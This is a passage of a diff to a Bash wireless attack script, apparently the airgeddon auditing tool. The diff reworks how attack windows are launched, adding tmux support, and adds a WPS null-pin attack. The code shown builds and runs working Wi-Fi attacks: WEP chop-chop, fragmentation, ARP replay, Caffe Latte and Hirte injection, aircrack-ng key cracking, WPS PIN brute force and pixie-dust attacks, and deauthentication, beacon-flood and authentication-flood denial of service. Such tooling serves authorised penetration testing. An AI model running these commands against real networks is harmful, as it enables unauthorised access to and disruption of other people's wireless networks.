+	cat >&8 <<-EOF
 		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
 		touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
 	EOF
@@ -2889,17 +3371,19 @@ function set_wep_key_script() {
 
 			window_position="${g5_topright_window}"
 			sleep 0.5
+			manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry \${window_position} -T \"WEP Key Decrypted\"" "clear;\${wep_key_cmd}" "WEP Key Decrypted" "active"
 	EOF
 
-	cat >&8 <<-'EOF'
-			xterm -hold -bg black -fg white -geometry "${window_position}" -T "WEP Key Decrypted" -e "eval \"${wep_key_cmd}\"" > /dev/null 2>&1 &
-			wep_key_window_pid=$!
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		cat >&8 <<-EOF
+			wep_key_window_pid=\$!
 			{
-			echo -e "${wep_key_window_pid}"
-	EOF
+				echo -e "\${wep_key_window_pid}"
+			} >> "${tmpdir}${wepdir}${wep_processes_file}"
+		EOF
+	fi
 
 	cat >&8 <<-EOF
-			} >> "${tmpdir}${wepdir}${wep_processes_file}"
 		fi
 	EOF
 }
@@ -2915,6 +3399,74 @@ function set_wep_script() {
 
 	cat >&6 <<-EOF
 		#!/usr/bin/env bash
+		AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING}"
+		global_process_pid=""
+
+		function manage_output() {
+
+			xterm_parameters="\${1}"
+			tmux_command_line="\${2}"
+			xterm_command_line="\"\${2}\""
+			window_name="\${3}"
+			command_tail=" > /dev/null 2>&1 &"
+
+			case "\${AIRGEDDON_WINDOWS_HANDLING}" in
+				"tmux")
+					local tmux_color
+					tmux_color=""
+					[[ "\${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="\${BASH_REMATCH[2]}"
+					case "\${4}" in
+						"active")
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}" "active"
+						;;
+						*)
+							start_tmux_processes "\${window_name}" "clear;\${tmux_command_line}" "\${tmux_color}"
+						;;
+					esac
+				;;
+				"xterm")
+					eval "xterm \${xterm_parameters} -e \${xterm_command_line}\${command_tail}"
+				;;
+			esac
+		}
+		function start_tmux_processes() {
+
+			window_name="\${1}"
+			command_line="\${2}"
+			tmux kill-window -t "${session_name}:\${window_name}" 2> /dev/null
+			case "\${4}" in
+				"active")
+					tmux new-window -t "${session_name}:" -n "\${window_name}"
+				;;
+				*)
+					tmux new-window -d -t "${session_name}:" -n "\${window_name}"
+				;;
+			esac
+			local tmux_color_cmd
+			if [ -n "\${3}" ]; then
+				tmux_color_cmd="bg=#000000 fg=\${3}"
+			else
+				tmux_color_cmd="bg=#000000"
+			fi
+			tmux setw -t "\${window_name}" window-style "\${tmux_color_cmd}"
+			tmux send-keys -t "${session_name}:\${window_name}" "\${command_line}" ENTER
+		}
+		function get_tmux_process_id() {
+
+			local process_pid
+			local process_cmd_line
+			process_cmd_line=\$(echo "\${1}" | tr -d '"')
+			while [ -z "\${process_pid}" ]; do
+				process_pid=\$(ps --no-headers aux | grep "\${process_cmd_line}" | grep -v "grep \${process_cmd_line}" | awk '{print \$2}')
+			done
+			global_process_pid="\${process_pid}"
+		}
+		function kill_tmux_window_by_name() {
+			if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				tmux kill-window -t "${session_name}:\${1}" 2> /dev/null
+			fi
+		}
+
 		#shellcheck disable=SC1037
 		#shellcheck disable=SC2164
 		#shellcheck disable=SC2140
@@ -2944,11 +3496,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-							xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (1/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" > /dev/null 2>&1 &
+							manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (1/3)\"" "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" "Chop-Chop Attack (1/3)"
+							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}"
+								wep_chopchop_phase1_pid="\${global_process_pid}"
+								global_process_pid=""
+							else
+								wep_chopchop_phase1_pid=\$!
+							fi
 	EOF
 
 	cat >&6 <<-'EOF'
-							wep_chopchop_phase1_pid=$!
 							wep_script_processes+=(${wep_chopchop_phase1_pid})
 						fi
 					fi
@@ -2957,28 +3515,38 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-					xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
+					kill_tmux_window_by_name "Chop-Chop Attack (1/3)"
+					manage_output "-bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" "Chop-Chop Attack (2/3)"
+					if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+						wep_chopchop_phase2_pid=\$!
+					fi
 	EOF
 
 	cat >&6 <<-'EOF'
-					wep_chopchop_phase2_pid=$!
-					wep_script_processes+=(${wep_chopchop_phase2_pid})
-					wep_chopchop_phase=3
-				;;
-				3)
-					wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
-					if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
+						wep_script_processes+=(${wep_chopchop_phase2_pid})
+						wep_chopchop_phase=3
+					;;
+					3)
+						wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
 	EOF
 
 	cat >&6 <<-EOF
-						xterm -hold -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
+						if [[ -z "\${wep_chopchop_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}chopchop.cap" ]]; then
+							kill_tmux_window_by_name "Chop-Chop Attack (2/3)"
+							manage_output "-hold -bg \"#000000\" -fg \"#8B4513\" -geometry ${g5_left7} -T \"Chop-Chop Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" "Chop-Chop Attack (3/3)"
+							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}"
+								wep_script_processes+=("\${global_process_pid}")
+								global_process_pid=""
+							else
+								wep_script_processes+=(\$!)
+							fi
 	EOF
 
 	cat >&6 <<-'EOF'
-						wep_script_processes+=($!)
-						wep_chopchop_phase=4
-					fi
-				;;
+							wep_chopchop_phase=4
+						fi
+					;;
 			esac
 			write_wep_processes
 		}
@@ -3007,11 +3575,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-							xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (1/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" > /dev/null 2>&1 &
+							manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (1/3)\"" "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" "Fragmentation Attack (1/3)"
+							if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+								get_tmux_process_id "aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}"
+								wep_fragmentation_phase1_pid="\${global_process_pid}"
+								global_process_pid=""
+							else
+								wep_fragmentation_phase1_pid=\$!
+							fi
 	EOF
 
 	cat >&6 <<-'EOF'
-							wep_fragmentation_phase1_pid=$!
 							wep_script_processes+=(${wep_fragmentation_phase1_pid})
 						fi
 					fi
@@ -3020,26 +3594,36 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-					xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" > /dev/null 2>&1 &
+						kill_tmux_window_by_name "Fragmentation Attack (1/3)"
+						manage_output "-bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (2/3)\"" "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" "Fragmentation Attack (2/3)"
+						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+							wep_fragmentation_phase2_pid=\$!
+						fi
 	EOF
 
 	cat >&6 <<-'EOF'
-					wep_fragmentation_phase2_pid=$!
-					wep_script_processes+=(${wep_fragmentation_phase2_pid})
 					wep_fragmentation_phase=3
+					wep_script_processes+=(${wep_fragmentation_phase2_pid})
 				;;
 				3)
 					wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase2_pid}$" 2> /dev/null)
-					if [ -z "${wep_fragmentation_phase2_pid_alive}" ]; then
 	EOF
 
 	cat >&6 <<-EOF
-						xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" > /dev/null 2>&1 &
+					if [[ -z "\${wep_fragmentation_phase2_pid_alive}" ]] && [[ -f "${tmpdir}${wepdir}fragmentation.cap" ]]; then
+						kill_tmux_window_by_name "Fragmentation Attack (2/3)"
+						manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g5_left6} -T \"Fragmentation Attack (3/3)\"" "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" "Fragmentation Attack (3/3)"
+						if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+							get_tmux_process_id "aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}"
+							wep_script_processes+=("\${global_process_pid}")
+							global_process_pid=""
+						else
+							wep_script_processes+=(\$!)
+						fi
 	EOF
 
 	cat >&6 <<-'EOF'
-						wep_script_processes+=($!)
-						wep_fragmentation_phase=4
+							wep_fragmentation_phase=4
 					fi
 				;;
 			esac
@@ -3074,11 +3658,18 @@ function set_wep_script() {
 		}
 
 		wep_script_processes=()
-		xterm -bg black -fg white -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" > /dev/null 2>&1 &
+
+		manage_output "-bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g5_topright_window} -T \"Capturing WEP Data\"" "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}" "Capturing WEP Data" "active"
+		if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+			get_tmux_process_id "airodump-ng -d ${bssid} -c ${channel} --encrypt WEP -w \"${tmpdir}${wep_data}\" ${interface}"
+			wep_script_capture_pid="\${global_process_pid}"
+			global_process_pid=""
+		else
+			wep_script_capture_pid=\$!
+		fi
 	EOF
 
 	cat >&6 <<-'EOF'
-		wep_script_capture_pid=$!
 		wep_script_processes+=(${wep_script_capture_pid})
 		write_wep_processes
 	EOF
@@ -3103,11 +3694,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-				xterm -bg black -fg green -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+				manage_output "-bg \"#000000\" -fg \"#00FF00\" -geometry ${g5_left1} -T \"Fake Auth\"" "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}" "Fake Auth"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -1 3 -o 1 -q 10 -a ${bssid} -h ${current_mac} ${interface}"
+					wep_fakeauth_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
+					wep_fakeauth_pid=\$!
+				fi
 	EOF
 
 	cat >&6 <<-'EOF'
-				wep_fakeauth_pid=$!
 				wep_script_processes+=(${wep_fakeauth_pid})
 				write_wep_processes
 				sleep 2
@@ -3118,35 +3715,44 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-				xterm -hold -bg black -fg yellow -geometry "${g5_left2}" -T "Arp Broadcast Injection" -e "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+				manage_output "-hold -bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_left2} -T \"Arp Broadcast Injection\"" "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" "Arp Broadcast Injection"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g5_left3} -T \"Arp Request Replay\"" "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" "Arp Request Replay"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#FFC0CB\" -geometry ${g5_left4} -T \"Caffe Latte Attack\"" "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Caffe Latte Attack"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
+
+				manage_output "-hold -bg \"#000000\" -fg \"#D3D3D3\" -geometry ${g5_left5} -T \"Hirte Attack\"" "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" "Hirte Attack"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}"
+					wep_script_processes+=("\${global_process_pid}")
+					global_process_pid=""
+				else
+					wep_script_processes+=(\$!)
+				fi
 	EOF
 
 	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
-	EOF
-
-	cat >&6 <<-EOF
-				xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Request Replay" -e "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" > /dev/null 2>&1 &
-	EOF
-
-	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
-	EOF
-
-	cat >&6 <<-EOF
-				xterm -hold -bg black -fg pink -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-	EOF
-
-	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
-	EOF
-
-	cat >&6 <<-EOF
-				xterm -hold -bg black -fg grey -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-	EOF
-
-	cat >&6 <<-'EOF'
-				wep_script_processes+=($!)
 				write_wep_processes
 			fi
 
@@ -3172,11 +3778,17 @@ function set_wep_script() {
 	EOF
 
 	cat >&6 <<-EOF
-				xterm -bg black -fg yellow -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" > /dev/null 2>&1 &
+				manage_output "-bg \"#000000\" -fg \"#FFFF00\" -geometry ${g5_bottomright_window} -T \"Decrypting WEP Key\"" "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" "Decrypting WEP Key" "active"
+				if [ "\${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+					get_tmux_process_id "aircrack-ng \"${tmpdir}${wep_data}\".*cap -l \"${tmpdir}${wepdir}wepkey.txt\""
+					wep_aircrack_pid="\${global_process_pid}"
+					global_process_pid=""
+				else
+					wep_aircrack_pid=\$!
+				fi
 	EOF
 
 	cat >&6 <<-'EOF'
-				wep_aircrack_pid=$!
 				wep_script_processes+=(${wep_aircrack_pid})
 				write_wep_processes
 			fi
@@ -3205,7 +3817,8 @@ function exec_wps_custom_pin_bully_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin bully attack"
 }
 
 #Execute wps custom pin reaver attack
@@ -3222,7 +3835,8 @@ function exec_wps_custom_pin_reaver_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS custom pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS custom pin reaver attack"
 }
 
 #Execute bully pixie dust attack
@@ -3239,7 +3853,8 @@ function exec_bully_pixiewps_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully pixie dust attack"
 }
 
 #Execute reaver pixie dust attack
@@ -3256,7 +3871,8 @@ function exec_reaver_pixiewps_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver pixie dust attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver pixie dust attack"
 }
 
 #Execute wps bruteforce pin bully attack
@@ -3273,7 +3889,8 @@ function exec_wps_bruteforce_pin_bully_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin bully attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin bully attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin bully attack"
 }
 
 #Execute wps bruteforce pin reaver attack
@@ -3290,7 +3907,8 @@ function exec_wps_bruteforce_pin_reaver_attack() {
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin reaver attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS bruteforce pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bruteforce pin reaver attack"
 }
 
 #Execute wps pin database bully attack
@@ -3303,7 +3921,8 @@ function exec_wps_pin_database_bully_attack() {
 	set_wps_attack_script "bully" "pindb"
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS bully known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS bully known pins database based attack"
 }
 
 #Execute wps pin database reaver attack
@@ -3316,7 +3935,26 @@ function exec_wps_pin_database_reaver_attack() {
 	set_wps_attack_script "reaver" "pindb"
 
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdright_window} -T \"WPS reaver known pins database based attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS reaver known pins database based attack"
+}
+
+#Execute wps null pin reaver attack
+function exec_reaver_nullpin_attack() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 32 "green"
+
+	set_wps_attack_script "reaver" "nullpin"
+
+	echo
+	language_strings "${language}" 33 "yellow"
+	language_strings "${language}" 4 "read"
+	recalculate_windows_sizes
+	manage_output "-hold -bg \"#000000\" -fg \"#FF0000\" -geometry ${g2_stdleft_window} -T \"WPS null pin reaver attack\"" "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack" "active"
+	wait_for_process "bash \"${tmpdir}${wps_attack_script_file}\"" "WPS null pin reaver attack"
 }
 
 #Execute DoS pursuit mode attack
@@ -3336,65 +3974,112 @@ function launch_dos_pursuit_mode_attack() {
 
 	recalculate_windows_sizes
 	case "${1}" in
-		"mdk3 amok attack")
+		"${mdk_command} amok attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"aireplay deauth attack")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			dos_delay=3
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"wids / wips / wds confusion attack")
 			dos_delay=10
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"beacon flood attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"auth dos attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m -s 1024"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"michael shutdown attack")
 			dos_delay=1
 			interface_pursuit_mode_scan="${interface}"
 			interface_pursuit_mode_deauth="${interface}"
